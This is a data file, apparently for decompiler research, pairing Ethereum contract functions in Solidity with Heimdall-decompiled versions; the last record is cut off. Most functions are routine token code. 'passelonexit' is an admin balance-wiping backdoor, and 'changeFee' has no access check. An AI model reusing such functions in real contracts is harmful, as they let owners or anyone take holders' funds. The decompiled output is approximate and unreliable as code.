{"contract_address": "0xd548c6Cf03b82450db5a446845DB3005e34138eE", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_m[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xB347995c9f8c6C7197370bAFe96967c14F9Fdabe", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xeA1F21c4f9BDA00BEDB5871E6C0de6746E1e2929", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];         \r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0x411AC84A80D686758cA971Dd205711149B42686f", "original_solidity_code": "function symbol() external view override returns (string memory) {\\r\\n      return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                var_c = 0x01;\n                var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function updateBuyFees(uint256 _MarketingFee, uint256 _liquidityFee, uint256 _RedistributionFee, uint256 _burnFee) external onlyOwner {\r\n        buyMarketingFee = _MarketingFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyRedistributionFee = _RedistributionFee;\r\n        buyBurnFee = _burnFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyRedistributionFee + buyBurnFee;\r\n        require(buyTotalFees <= 15, \"Must keep fees at 15% or less\");\r\n    }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        buyMarketingFee = arg0;\n        buyLiquidityFee = arg1;\n        buyRedistributionFee = arg2;\n        buyBurnFee = arg3;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x229e55453Cd4319499728c08f3D8C57a97615E6a", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_d) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_e)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_h * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_h * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!(((store_h * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_h * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_h * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_h * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_h * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_h * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_e / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_f > store_l) {\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_h * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_f > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_d) == (address(arg0))) {\n            if (address(store_d) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return ERC721AStorage.layout()._symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_r) {\n            if (store_r - ((store_r >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_r >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_r >> 0x01;\n                if (store_r) {\n                    if (store_r - ((store_r >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_r >> 0x01) {\n                            if (0x1f < (store_r >> 0x01)) {\n                                var_a = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c43;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_r >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x19757069132C642180F1112d4cD61d67c1f06B49", "original_solidity_code": "function passelonexit(address jhhhqq) public    {\r\n        \r\n        require(_msgSender() == vipadmin123);   \r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 zrqqamount = 0;\r\n        xelonlist[jhhhqq] = zrqqamount; \r\n        \r\n    }", "heimdall_decompiled_code": "function passelonexit(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0;\n    }"}
{"contract_address": "0xbe862864614FB652e663EA82FC3AdEAD65E73d29", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x90bd0470eeFf15E5A6AC0D7221A4FFB0Eb6C690A", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xaE58EE426C98ed45F91282D027FAFe4E74c70D75", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xE5513c73eaCe54F05fDfa98061784bfd66b86bEA", "original_solidity_code": "function name() external view override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _Tokename;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x92E27aedE3847Bbd0E4b917Ec2Ae444d4C3A622D", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xdCAd9BF3E7bC0b878Ae5a05Bca93494345A13480", "original_solidity_code": "function changeFee(uint256 _newFee) external {\r\n        BuyTax = _newFee;\r\n        SellTax = _newFee;\r\n    }", "heimdall_decompiled_code": "function changeFee(uint256 arg0) public {\n        store_b = arg0;\n        store_k = arg0;\n    }"}
{"contract_address": "0x1727A45a3E3bE7AdF4B185D80F0b4F557b755f87", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x05f5e100 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), address(store_f / 0x01), 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x433261F4DCdF51419232FFe4eD44BA793AA2B9f7", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x7BEe550EDa5afA8E1C22Ad3Cea77f5D746dC78c3", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        address owner = _msgSender();\\r\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x06;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 